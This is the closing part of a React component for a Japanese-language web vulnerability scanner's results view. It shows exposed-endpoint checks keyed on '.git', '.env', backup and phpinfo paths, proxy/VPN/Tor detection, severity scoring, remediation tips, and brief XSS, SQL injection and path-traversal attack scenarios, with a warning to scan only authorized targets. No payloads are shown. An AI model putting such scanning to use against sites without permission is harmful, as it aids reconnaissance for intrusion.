                                 endpoint.includes('/api') ? 'API エンドポイントが保護されていません' : 
                                 endpoint.includes('/wp-') ? 'WordPress ファイルが露出しています' :
                                 endpoint.includes('.git') ? 'Gitリポジトリが公開されています' :
                                 endpoint.includes('.env') ? '環境設定ファイルが露出しています' :
                                 endpoint.includes('.bak') ? 'バックアップファイルが露出しています' :
                                 endpoint.includes('phpinfo') ? 'PHP情報ページが公開されています' :
                                 '潜在的に機密性の高いエンドポイント'}
                              </p>
                            </div>
                            <a 
                              href={endpoint} 
                              target="_blank" 
                              rel="noopener noreferrer" 
                              className="flex items-center text-blue-600 hover:text-blue-800 text-sm"
                            >
                              <ExternalLink size={16} className="mr-1" />
                              開く
                            </a>
                          </motion.div>
                        ))}
                      </div>
                    ) : (
                      <p className="text-center text-gray-500 py-4">露出したエンドポイントは検出されませんでした。</p>
                    )}
                  </div>
                </TabsContent>
                
                <TabsContent value="ip" className="mt-4">
                  <div className="p-4 bg-gray-50 rounded-lg">
                    <h3 className="text-lg font-medium mb-3">ホスト情報分析</h3>
                    
                    {scanResult.ipInfo && (
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="bg-white p-4 rounded-lg shadow-sm">
                          <div className="flex items-center gap-2 mb-2">
                            <Server className="h-5 w-5 text-blue-500" />
                            <h4 className="font-medium">サーバー情報</h4>
                          </div>
                          <div className="flex flex-col space-y-2">
                            <div className="flex justify-between">
                              <span className="text-sm text-gray-500">IPアドレス:</span>
                              <span className="text-sm font-mono">{scanResult.ipInfo.ip}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-sm text-gray-500">地域:</span>
                              <span className="text-sm">{scanResult.ipInfo.location || '不明'}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-sm text-gray-500">Webサーバー:</span>
                              <span className="text-sm font-mono">{scanResult.serverInfo.server || '不明'}</span>
                            </div>
                            <div>
                              <span className="text-sm text-gray-500 block mb-1">検出された技術:</span>
                              <div className="flex flex-wrap gap-1">
                                {scanResult.serverInfo.tech?.map((tech, idx) => (
                                  <span key={idx} className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-blue-100 text-blue-800">
                                    {tech}
                                  </span>
                                ))}
                              </div>
                            </div>
                          </div>
                        </div>
                        
                        <div className="bg-white p-4 rounded-lg shadow-sm">
                          <div className="flex items-center gap-2 mb-2">
                            <Shield className="h-5 w-5 text-blue-500" />
                            <h4 className="font-medium">セキュリティステータス</h4>
                          </div>
                          <div className="space-y-2">
                            <div className="flex justify-between items-center">
                              <span className="text-sm text-gray-500">プロキシ検出:</span>
                              <span className={`text-sm px-2 py-0.5 rounded ${scanResult.ipInfo.proxy ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'}`}>
                                {scanResult.ipInfo.proxy ? '検出' : '未検出'}
                              </span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-sm text-gray-500">VPN検出:</span>
                              <span className={`text-sm px-2 py-0.5 rounded ${scanResult.ipInfo.vpn ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'}`}>
                                {scanResult.ipInfo.vpn ? '検出' : '未検出'}
                              </span>
                            </div>
                            <div className="flex justify-between items-center">
                              <span className="text-sm text-gray-500">Tor出口ノード:</span>
                              <span className={`text-sm px-2 py-0.5 rounded ${scanResult.ipInfo.tor ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'}`}>
                                {scanResult.ipInfo.tor ? '検出' : '未検出'}
                              </span>
                            </div>
                          </div>
                        </div>
                        
                        {scanResult.scanDetails && (
                          <div className="bg-white p-4 rounded-lg shadow-sm col-span-1 md:col-span-2">
                            <div className="flex items-center gap-2 mb-2">
                              <Code className="h-5 w-5 text-green-500" />
                              <h4 className="font-medium">スキャン詳細情報</h4>
                            </div>
                            <div className="grid grid-cols-2 gap-4">
                              <div>
                                <p className="text-sm text-gray-500 mb-1">スキャン実行時間:</p>
                                <p className="text-sm font-medium">{scanResult.scanDetails.scanDuration}秒</p>
                              </div>
                              <div>
                                <p className="text-sm text-gray-500 mb-1">リクエスト数:</p>
                                <p className="text-sm font-medium">{scanResult.scanDetails.requestsCount}</p>
                              </div>
                              <div>
                                <p className="text-sm text-gray-500 mb-1">テスト済みパラメータ:</p>
                                <div className="flex flex-wrap gap-1">
                                  {scanResult.scanDetails.testedParameters.map((param, idx) => (
                                    <span key={idx} className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-gray-100 text-gray-800">
                                      {param}
                                    </span>
                                  ))}
                                </div>
                              </div>
                              <div>
                                <p className="text-sm text-gray-500 mb-1">テスト済みエンドポイント:</p>
                                <p className="text-sm font-medium">{scanResult.scanDetails.testedEndpoints.length}</p>
                              </div>
                            </div>
                          </div>
                        )}
                        
                        <div className="bg-white p-4 rounded-lg shadow-sm col-span-1 md:col-span-2">
                          <div className="flex items-center gap-2 mb-2">
                            <AlertCircle className="h-5 w-5 text-yellow-500" />
                            <h4 className="font-medium">リスク評価</h4>
                          </div>
                          <div>
                            <p className="text-sm text-gray-600 mb-2">
                              {scanResult.ipInfo.proxy || scanResult.ipInfo.vpn || scanResult.ipInfo.tor ? 
                                'IPアドレスの匿名化が検出されました。これは合法的なプライバシー保護のためかもしれませんが、攻撃者が身元を隠すためにも使用される可能性があります。' : 
                                'IPアドレスの匿名化は検出されませんでした。これは通常のインターネット接続を示唆しています。'}
                            </p>
                            
                            {(scanResult.ipInfo.proxy || scanResult.ipInfo.vpn || scanResult.ipInfo.tor) && (
                              <div className="bg-yellow-50 border border-yellow-200 rounded p-3 text-sm">
                                <p className="font-medium text-yellow-800 mb-1">セキュリティ対策推奨:</p>
                                <ul className="list-disc list-inside text-yellow-700 space-y-1">
                                  <li>追加の認証措置（多要素認証など）を実装してください</li>
                                  <li>重要な操作に対する追加の確認ステップを追加してください</li>
                                  <li>IP制限のあるアクセスポリシーを検討してください</li>
                                </ul>
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </TabsContent>
                
                <TabsContent value="visualize" className="mt-4">
                  <div className="bg-gray-50 rounded-lg p-4">
                    <h3 className="text-lg font-medium mb-3">脆弱性の視覚化</h3>
                    
                    <div className="relative bg-white rounded-lg border border-gray-200 p-4 overflow-hidden">
                      {/* Website representation */}
                      <div className="border-b pb-2 mb-4 text-center">
                        <div className="flex items-center justify-center">
                          <Lock className="h-4 w-4 text-gray-400 mr-1" />
                          <span className="text-sm text-gray-500 truncate">{url}</span>
                        </div>
                      </div>
                      
                      {/* Website layout representation */}
                      <div className="h-64 relative">
                        {/* Header */}
                        <div className="absolute top-0 left-0 right-0 h-10 bg-gray-100 rounded-t"></div>
                        
                        {/* Main content area */}
                        <div className="absolute top-12 left-0 right-0 bottom-12 flex">
                          {/* Sidebar */}
                          <div className="w-1/4 bg-gray-50 mr-2"></div>
                          
                          {/* Content */}
                          <div className="flex-1 bg-white relative">
                            {vulnerabilities.map((vuln, index) => {
                              // Calculate random position for vulnerability "hole"
                              const top = Math.floor(Math.random() * 80) + 10;
                              const left = Math.floor(Math.random() * 80) + 10;
                              const size = vuln.severity === 'Critical' ? 40 : 
                                         vuln.severity === 'High' ? 30 :
                                         vuln.severity === 'Medium' ? 20 : 15;
                                         
                              return (
                                <motion.div
                                  key={index}
                                  initial={{ scale: 0 }}
                                  animate={{ scale: 1 }}
                                  transition={{ 
                                    delay: index * 0.2,
                                    type: 'spring',
                                    stiffness: 200,
                                    damping: 10
                                  }}
                                  className="absolute rounded-full cursor-pointer flex items-center justify-center"
                                  style={{
                                    top: `${top}%`,
                                    left: `${left}%`,
                                    width: size,
                                    height: size,
                                    backgroundColor: vuln.severity === 'Critical' ? 'rgba(220, 38, 38, 0.8)' :
                                                   vuln.severity === 'High' ? 'rgba(234, 88, 12, 0.7)' :
                                                   vuln.severity === 'Medium' ? 'rgba(234, 179, 8, 0.6)' :
                                                   'rgba(59, 130, 246, 0.5)',
                                    boxShadow: vuln.severity === 'Critical' ? '0 0 20px rgba(220, 38, 38, 0.7)' :
                                              vuln.severity === 'High' ? '0 0 15px rgba(234, 88, 12, 0.6)' : 
                                              'none',
                                    zIndex: vuln.severity === 'Critical' ? 30 :
                                           vuln.severity === 'High' ? 20 :
                                           vuln.severity === 'Medium' ? 10 : 1,
                                  }}
                                  onClick={() => handleViewDetails(vuln)}
                                  title={`${vuln.type}: ${vuln.description}`}
                                >
                                  {vuln.severity === 'Critical' && <AlertTriangle className="h-6 w-6 text-white" />}
                                </motion.div>
                              );
                            })}
                          </div>
                        </div>
                        
                        {/* Footer */}
                        <div className="absolute bottom-0 left-0 right-0 h-10 bg-gray-100 rounded-b"></div>
                      </div>
                      
                      <div className="mt-4 flex flex-wrap justify-center gap-2">
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-red-600 mr-1"></div>
                          <span className="text-xs">Critical</span>
                        </div>
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-orange-500 mr-1"></div>
                          <span className="text-xs">High</span>
                        </div>
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-yellow-400 mr-1"></div>
                          <span className="text-xs">Medium</span>
                        </div>
                        <div className="flex items-center">
                          <div className="w-3 h-3 rounded-full bg-blue-400 mr-1"></div>
                          <span className="text-xs">Low</span>
                        </div>
                      </div>
                      
                      <p className="text-xs text-gray-500 mt-2 text-center">
                        ※ 色付きの円は脆弱性の「穴」を表しています。サイズが大きいほど重大な脆弱性です。脆弱性をクリックすると詳細が表示されます。
                      </p>
                    </div>
                  </div>
                </TabsContent>
                
                <TabsContent value="summary" className="mt-4">
                  <div className="p-4 bg-gray-50 rounded-lg">
                    <h3 className="text-lg font-medium mb-3">スキャン概要</h3>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">スキャンしたURL</p>
                        <p className="font-medium truncate">{url}</p>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">検出された脆弱性</p>
                        <p className="font-medium">{vulnerabilities.length}</p>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">サーバー情報</p>
                        <p className="font-medium">{scanResult.serverInfo.server || 'Unknown'}</p>
                        <div className="flex flex-wrap gap-1 mt-1">
                          {scanResult.serverInfo.tech?.map((tech, index) => (
                            <span key={index} className="text-xs bg-gray-100 px-2 py-0.5 rounded">
                              {tech}
                            </span>
                          ))}
                        </div>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm">
                        <p className="text-sm text-gray-500">露出エンドポイント</p>
                        <p className="font-medium">{scanResult.exposedEndpoints.length}</p>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm col-span-2">
                        <p className="text-sm text-gray-500">深刻度の内訳</p>
                        <div className="flex gap-2 mt-2">
                          {['Critical', 'High', 'Medium', 'Low'].map((severity) => {
                            const count = vulnerabilities.filter(v => v.severity === severity).length;
                            return (
                              <div key={severity} className={`px-2 py-1 rounded-md text-xs flex items-center gap-1 ${getSeverityColor(severity)}`}>
                                <span>{severity}</span>
                                <span className="font-bold">{count}</span>
                              </div>
                            );
                          })}
                        </div>
                      </div>
                      <div className="bg-white p-4 rounded-lg shadow-sm col-span-2">
                        <p className="text-sm text-gray-500 mb-2">セキュリティ評価</p>
                        <div className="relative pt-1">
                          <div className="flex items-center justify-between">
                            <div>
                              <span className="text-xs font-semibold inline-block text-red-600">
                                危険
                              </span>
                            </div>
                            <div>
                              <span className="text-xs font-semibold inline-block text-green-600">
                                安全
                              </span>
                            </div>
                          </div>
                          <div className="overflow-hidden h-2 mb-4 text-xs flex rounded bg-gray-200">
                            {/* スコア計算 */}
                            {(() => {
                              const criticalCount = vulnerabilities.filter(v => v.severity === 'Critical').length;
                              const highCount = vulnerabilities.filter(v => v.severity === 'High').length;
                              const mediumCount = vulnerabilities.filter(v => v.severity === 'Medium').length;
                              const lowCount = vulnerabilities.filter(v => v.severity === 'Low').length;
                              const proxyPenalty = scanResult.ipInfo?.proxy || scanResult.ipInfo?.vpn || scanResult.ipInfo?.tor ? 10 : 0;
                              
                              // Calculate score (0-100, higher is better)
                              let score = 100;
                              score -= criticalCount * 25;
                              score -= highCount * 15;
                              score -= mediumCount * 7;
                              score -= lowCount * 3;
                              score -= proxyPenalty;
                              score = Math.max(5, score); // Minimum score of 5
                              
                              // Color based on score
                              let color = '';
                              if (score >= 80) color = 'bg-green-500';
                              else if (score >= 60) color = 'bg-green-300';
                              else if (score >= 40) color = 'bg-yellow-400';
                              else if (score >= 20) color = 'bg-orange-400';
                              else color = 'bg-red-500';
                              
                              return (
                                <div
                                  style={{ width: `${score}%` }}
                                  className={`shadow-none flex flex-col text-center whitespace-nowrap text-white justify-center ${color}`}
                                ></div>
                              );
                            })()}
                          </div>
                          <div className="text-center">
                            <span className="text-sm font-medium">
                              {(() => {
                                const criticalCount = vulnerabilities.filter(v => v.severity === 'Critical').length;
                                const highCount = vulnerabilities.filter(v => v.severity === 'High').length;
                                
                                if (criticalCount > 0) {
                                  return '緊急の対応が必要です';
                                } else if (highCount > 0) {
                                  return '重大な脆弱性が存在します';
                                } else if (vulnerabilities.length > 0) {
                                  return '脆弱性が見つかりました';
                                } else {
                                  return 'セキュリティリスクは検出されませんでした';
                                }
                              })()}
                            </span>
                          </div>
                        </div>
                      </div>
                      
                      <div className="bg-white p-4 rounded-lg shadow-sm col-span-2">
                        <p className="text-sm text-gray-500 mb-2">推奨される対策</p>
                        <ul className="list-disc list-inside text-sm space-y-1.5">
                          {vulnerabilities.length > 0 ? (
                            <>
                              {vulnerabilities.some(v => v.type === 'XSS') && (
                                <li className="text-gray-700">
                                  <span className="font-medium">入力検証とサニタイズの強化</span>: すべてのユーザー入力に対して適切なエスケープ処理を実装してください。
                                </li>
                              )}
                              {vulnerabilities.some(v => v.type === 'SQLInjection') && (
                                <li className="text-gray-700">
                                  <span className="font-medium">パラメータ化クエリの使用</span>: すべてのデータベースクエリにプリペアドステートメントを使用してください。
                                </li>
                              )}
                              {vulnerabilities.some(v => v.type === 'CSRF') && (
                                <li className="text-gray-700">
                                  <span className="font-medium">CSRFトークンの実装</span>: すべてのフォームに対してCSRF対策を実装してください。
                                </li>
                              )}
                              {vulnerabilities.some(v => v.type === 'DirectoryTraversal') && (
                                <li className="text-gray-700">
                                  <span className="font-medium">パス検証の強化</span>: ファイルパスに対して厳格な検証を実装してください。
                                </li>
                              )}
                              {vulnerabilities.some(v => v.type === 'WeakCredentials') && (
                                <li className="text-gray-700">
                                  <span className="font-medium">強固なパスワードポリシーの導入</span>: 複雑なパスワードを要求し、多要素認証を実装してください。
                                </li>
                              )}
                              {vulnerabilities.some(v => v.type === 'InsecureAPI') && (
                                <li className="text-gray-700">
                                  <span className="font-medium">API認証の強化</span>: 適切な認証と認可メカニズムを実装し、APIのアクセス制御を厳格化してください。
                                </li>
                              )}
                              <li className="text-gray-700">
                                <span className="font-medium">定期的なセキュリティ監査</span>: 脆弱性スキャンを定期的に実施して、新たな脆弱性を早期に発見してください。
                              </li>
                            </>
                          ) : (
                            <>
                              <li className="text-gray-700">
                                <span className="font-medium">継続的なモニタリング</span>: 定期的にセキュリティスキャンを実施し、新たな脆弱性を監視してください。
                              </li>
                              <li className="text-gray-700">
                                <span className="font-medium">セキュリティアップデート</span>: 常に最新のセキュリティパッチとアップデートを適用してください。
                              </li>
                            </>
                          )}
                        </ul>
                      </div>
                    </div>
                  </div>
                </TabsContent>
              </Tabs>
            )}
          </div>
        </CardContent>
        <CardFooter className="bg-gray-50 flex flex-col items-start pt-4">
          <div className="bg-red-50 border-l-4 border-red-500 p-3 rounded w-full">
            <p className="text-sm text-red-600">
              <span className="font-bold">注意:</span> このスキャナーは実際のセキュリティ脆弱性を検出します。法的に許可された対象に対してのみ使用してください。
              適切な承認なしに第三者のウェブサイトをスキャンすることは法律違反となる場合があります。
            </p>
          </div>
        </CardFooter>
      </Card>
      
      {/* 脆弱性詳細モーダル */}
      {showModal && selectedVulnerability && (
        <div className="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full z-50 flex items-center justify-center">
          <div className="relative mx-auto p-5 border w-11/12 md:w-3/4 lg:w-1/2 shadow-lg rounded-md bg-white">
            <div className="flex justify-between items-center border-b pb-3 mb-4">
              <h3 className="text-lg font-medium flex items-center gap-2">
                {getVulnerabilityIcon(selectedVulnerability.type)}
                <span>{selectedVulnerability.type} 脆弱性詳細</span>
                <span className={`ml-2 text-xs px-2 py-1 rounded-full ${getSeverityColor(selectedVulnerability.severity)}`}>
                  {selectedVulnerability.severity}
                </span>
              </h3>
              <button
                onClick={() => setShowModal(false)}
                className="text-gray-400 hover:text-gray-500"
              >
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            
            <div className="space-y-4">
              <div>
                <h4 className="font-semibold text-gray-900">説明:</h4>
                <p>{selectedVulnerability.description}</p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">技術的詳細:</h4>
                <div className="bg-gray-50 p-4 rounded">
                  {selectedVulnerability.details && (
                    <p className="mb-3 text-sm">{selectedVulnerability.details}</p>
                  )}
                  
                  {selectedVulnerability.type === 'XSS' && (
                    <div className="space-y-3">
                      <div>
                        <h5 className="font-medium">攻撃シナリオ:</h5>
                        <ol className="list-decimal list-inside text-sm space-y-1">
                          <li>攻撃者が脆弱なページに悪意のあるスクリプトを送信します</li>
                          <li>サーバーがスクリプトを適切にエスケープせずにユーザーに返します</li>
                          <li>ユーザーのブラウザがスクリプトを実行し、Cookieやセッション情報が漏洩します</li>
                        </ol>
                      </div>
                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
                        <>
                          <div>
                            <h5 className="font-medium">HTTP リクエスト:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.requestData}</code>
                            </pre>
                          </div>
                          <div>
                            <h5 className="font-medium">HTTP レスポンス:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.responseData}</code>
                            </pre>
                          </div>
                        </>
                      )}
                    </div>
                  )}
                  
                  {selectedVulnerability.type === 'SQLInjection' && (
                    <div className="space-y-3">
                      <p>
                        SQLインジェクションは、アプリケーションがユーザー入力を適切に検証せずにSQL文に挿入する際に発生します。
                        攻撃者はSQL文の構造を変更し、データベースからデータを抽出したり改ざんしたりできます。
                      </p>
                      <div>
                        <h5 className="font-medium">攻撃シナリオ:</h5>
                        <ol className="list-decimal list-inside text-sm space-y-1">
                          <li>脆弱なフォームやURLパラメータに悪意のあるSQL文を注入します</li>
                          <li>アプリケーションはこれを有効なクエリとして処理します</li>
                          <li>データベースが攻撃者の意図した操作を実行します</li>
                        </ol>
                      </div>
                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
                        <>
                          <div>
                            <h5 className="font-medium">HTTP リクエスト:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.requestData}</code>
                            </pre>
                          </div>
                          <div>
                            <h5 className="font-medium">HTTP レスポンス:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.responseData}</code>
                            </pre>
                          </div>
                        </>
                      )}
                    </div>
                  )}
                  
                  {selectedVulnerability.type === 'DirectoryTraversal' && (
                    <div className="space-y-3">
                      <p>
                        ディレクトリトラバーサル（パストラバーサル）攻撃では、攻撃者はファイルシステム内のパスを操作して、
                        アクセスすべきでないディレクトリやファイルにアクセスします。
                      </p>
                      <div>
                        <h5 className="font-medium">攻撃シナリオ:</h5>
                        <ol className="list-decimal list-inside text-sm space-y-1">
                          <li>攻撃者は「../」などの特殊なパス指定子を使用してディレクトリを上に移動します</li>
                          <li>サーバーがパスの検証を適切に行わないと、重要なシステムファイルが露出します</li>
                        </ol>
                      </div>
                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
                        <>
                          <div>
                            <h5 className="font-medium">HTTP リクエスト:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.requestData}</code>
                            </pre>
                          </div>
                          <div>
                            <h5 className="font-medium">HTTP レスポンス:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.responseData}</code>
                            </pre>
                          </div>
                        </>
                      )}
                    </div>
                  )}
                  
                  {/* デフォルト表示（他の脆弱性タイプ用） */}
                  {!['XSS', 'SQLInjection', 'DirectoryTraversal'].includes(selectedVulnerability.type) && (
                    <div className="space-y-3">
                      <p>この脆弱性は {selectedVulnerability.endpoint || url} で検出されました。</p>
                      <p>影響: {selectedVulnerability.impact}</p>
                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
                        <>
                          <div>
                            <h5 className="font-medium">HTTP リクエスト:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.requestData}</code>
                            </pre>
                          </div>
                          <div>
                            <h5 className="font-medium">HTTP レスポンス:</h5>
                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                              <code>{selectedVulnerability.responseData}</code>
                            </pre>
                          </div>
                        </>
                      )}
                    </div>
                  )}
                </div>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">影響:</h4>
                <p>{selectedVulnerability.impact}</p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">推奨される対策:</h4>
                <p>{selectedVulnerability.solution}</p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-900">参考リソース:</h4>
                <ul className="list-disc list-inside text-sm text-blue-600 space-y-1">
                  <li>
                    <a href="https://owasp.org/Top10/" target="_blank" rel="noopener noreferrer">
                      OWASP Top 10
                    </a>
                  </li>
                  <li>
                    <a href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener noreferrer">
                      OWASP Cheat Sheet Series
                    </a>
                  </li>
                  <li>
                    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer">
                      PortSwigger Web Security Academy
                    </a>
                  </li>
                </ul>
              </div>
            </div>
            
            <div className="mt-6 text-right">
              <Button onClick={() => setShowModal(false)}>閉じる</Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default SecurityScanner;
